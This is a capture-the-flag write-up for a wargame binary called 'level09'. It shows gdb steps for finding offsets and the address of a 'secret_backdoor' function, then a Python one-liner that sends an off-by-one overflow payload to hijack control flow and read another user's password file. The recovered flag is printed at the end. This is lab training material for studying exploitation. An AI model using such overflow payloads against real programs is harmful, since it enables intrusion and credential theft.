Program behavior:
1. Sets message length to 140 bytes;
2. Reads from stdin to a buffer (username) using `fgets` function;
3. Copies that buffer to a struct using `for` loop;
4. Reads from stdin to a buffer (msg) using `fgets` function;
5. Copies that buffer to a struct using `strncpy` function;

Solution:
Call `secret_backdoor` function using off-by-one overflow.

# Launch the debugger
gdb level09
# Disassemble set_username
disassemble set_username
`0x0000555555554a6a <+157>:   cmpl   $0x28,-0x4(%rbp)`
# Calculate first offset
print/d 0x28
`$1 = 40`
# Run the debugged program
start
# Calculate new length value
print/x ($rbp + 8) - ($rbp - 0xc0) + 8
`$1 = 0xd0`
# Calculate second offset
print/d ($rbp + 8) - ($rbp - 0xc0)
`$2 = 200`
# Get address of secret_backdoor function
print/a &secret_backdoor
`$3 = 0x55555555488c <secret_backdoor>`
# Initiate off-by-one overfloww
(python -c 'print "B" * 40 + "\xd0\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00\n" + "cat /home/users/end/.pass"') | ./level09
`j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`
